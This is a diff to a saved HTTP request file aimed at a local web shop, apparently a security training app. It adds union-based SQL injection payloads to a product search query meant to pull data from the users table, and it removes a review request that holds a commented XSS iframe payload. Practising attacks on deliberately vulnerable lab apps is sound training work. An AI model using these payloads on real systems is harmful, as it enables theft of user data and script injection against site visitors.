@@ -1,4 +1,5 @@
-PUT /rest/products/30/reviews HTTP/1.1
+#GET /rest/products/search?q=')) union select * from users--
+GET /rest/products/search?q=asdf')) union select '1', '2', '3', '4', '5', '6', '7', '8', '9' from users--
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
 Accept: application/json, text/plain, */*
@@ -14,9 +15,3 @@ Cookie: _ga=GA1.1.1514541091.1609947200; language=de_DE; welcomebanner_status=di
 Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
-
-{
-    //"message":"I was here <iframe src=\"javascript:alert(`xss`)\">",
-    "message": "Schmeckt nur im Flugzeug",
-    "author":"cla@ongoingmedia.de"
-}
